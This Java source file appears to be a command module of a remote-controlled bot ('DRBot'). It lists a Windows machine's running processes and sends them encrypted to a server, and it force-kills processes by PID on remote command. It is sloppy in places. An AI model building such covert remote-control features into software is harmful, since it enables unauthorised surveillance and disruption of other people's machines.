package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class ps implements Runnable{
    
    //init
    private final String[] fullCommands;
    private final List<String> allProc;
    private String[] myProc;
    private String result = "";
    private final PrintWriter writer;
    private BufferedReader reader;
    private String msg;
    private ProcessBuilder pB;
    private Process pro;
    private final SecureLine secureLine;
    
    public ps(String[] commands,PrintWriter writer,SecureLine secureLine)throws IOException{
        this.writer = writer;
        allProc = new ArrayList<>();
        fullCommands = new String[commands.length-1];
        this.secureLine = secureLine;
        for(int i = 1;i<commands.length;i++){
            fullCommands[i-1] = commands[i];
        }
    }
    
    @Override
    public void run(){
        if(fullCommands[0].equals("-list")){
            pB = new ProcessBuilder("tasklist","/fo","csv","/nh","/fi","\"STATUS","eq","running\"");
            try
            {
                pro = pB.start();
                reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                String line;
                while((line = reader.readLine())!=null){
                    myProc = line.split(",");
                    allProc.add("("+myProc[0].replace("\"", "")+"|"+myProc[1].replace("\"", "")+")");
                }
                reader.close();
                pro.waitFor();
                pro.destroy();
                
               //Process to send the processes to the server.
                
                
                if(allProc.size()<20){
                Iterator<String> iter = allProc.iterator();
                while(iter.hasNext()){
                        result += iter.next()+",";
                        }
                printProc("[Processes] "+result);
                result = "";
                }
                else
                    if(allProc.size()>20 && allProc.size()<40){
                        
                        List<String> list1 = new ArrayList<>();
                        List<String> list2 = new ArrayList<>();
                        
                        list1 = allProc.subList(0,allProc.size()/2);
                        list2 = allProc.subList(allProc.size()/2,allProc.size());
                        
                        Iterator<String> iter1 = list1.iterator();
                        Iterator<String> iter2 = list2.iterator();
                        
                        while(iter1.hasNext()){
                            result += iter1.next()+",";
                        }
                        printProc("[Processes] "+result);
                        result = "";
                            
                        while(iter2.hasNext()){
                            result += iter2.next() + ",";
                        }
                        printProc("[Processes] "+result);
                        result = null;
                        } //end of sub divided
                else
                        if(allProc.size()>40 && allProc.size()<60){
                                List<String> list1 = new ArrayList<>();
                                List<String> list2 = new ArrayList<>();
                                List<String> list3 = new ArrayList<>();
                                  
                                list1 = allProc.subList(0,(allProc.size()/3));
                                list2 = allProc.subList((allProc.size()/3),((allProc.size()*2)/3));
                                list3 = allProc.subList(((allProc.size()*2)/3),allProc.size());
                        
                                Iterator<String> iter1 = list1.iterator();
                                Iterator<String> iter2 = list2.iterator();
                                Iterator<String> iter3 = list3.iterator();
                        
                                while(iter1.hasNext()){
                                    result += iter1.next()+",";
                                }
                                    printProc("[Processes] "+result);
                                    result = "";
                            
                                while(iter2.hasNext()){
                                        result += iter2.next() + ",";
                                    }
                                        printProc("[Processes] "+result);;
                                        result = "";
                                while(iter3.hasNext()){
                                        result += iter3.next() + ",";
                                }
                                        printProc("[Processes] "+result);
                                        result = null;
                        }
                else
                            if(allProc.size()>60 && allProc.size()<80){
                                List<String> list1 = new ArrayList<>();
                                List<String> list2 = new ArrayList<>();
                                List<String> list3 = new ArrayList<>();
                                List<String> list4 = new ArrayList<>();
                                  
                                list1 = allProc.subList(0,(allProc.size()/4));
                                list2 = allProc.subList((allProc.size()/4),((allProc.size()*2)/4));
                                list3 = allProc.subList(((allProc.size()*2)/4),((allProc.size()*3)/4));
                                list4 = allProc.subList(((allProc.size()*3)/4), allProc.size());
                        
                                Iterator<String> iter1 = list1.iterator();
                                Iterator<String> iter2 = list2.iterator();
                                Iterator<String> iter3 = list3.iterator();
                                Iterator<String> iter4 = list4.iterator();
                                
                        
                                while(iter1.hasNext()){
                                    result += iter1.next()+",";
                                }
                                    printProc("[Processes] "+result);
                                    result = "";
                            
                                while(iter2.hasNext()){
                                        result += iter2.next() + ",";
                                    }
                                        printProc("[Processes] "+result);
                                        result = "";
                                while(iter3.hasNext()){
                                        result += iter3.next() + ",";
                                }
                                        printProc("[Processes] "+result);
                                while(iter4.hasNext()){
                                        result += iter4.next() + ",";
                                }
                                
                                        printProc("[Processes] "+result);
                                        result = null;
                            }
            }
            catch(IOException exe){}
            catch(InterruptedException intte){}
        }
        else
            if(fullCommands[0].equals("-kill") && fullCommands[1]!=null){
                pB = new ProcessBuilder("taskkill","/F","/PID",fullCommands[1]);
                try
                {
                   pro = pB.start();
                   pro.waitFor();
                   pro.destroy();
                   printProc("[Process Killer] "+fullCommands[1]+" is Terminated Successfully.");
                }
                catch(IOException edd){}
                catch(InterruptedException inter){}
            }
    }
    private void printProc(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    
}
